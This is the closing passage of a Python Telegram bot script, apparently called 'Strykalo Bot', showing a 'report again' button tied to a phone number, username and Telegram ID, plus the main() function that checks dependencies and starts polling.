    await cb.message.answer("📝 Репортнуть ещё?", reply_markup=report_again_kb(phone, username, tg_id))

# ═══════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════

async def main():
    if not AIOGRAM_OK:
        print("[!] pip install aiogram"); return
    if not AIOHTTP_OK:
        print("[!] pip install aiohttp"); return
    logger.info("Strykalo Bot v9.7 starting...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())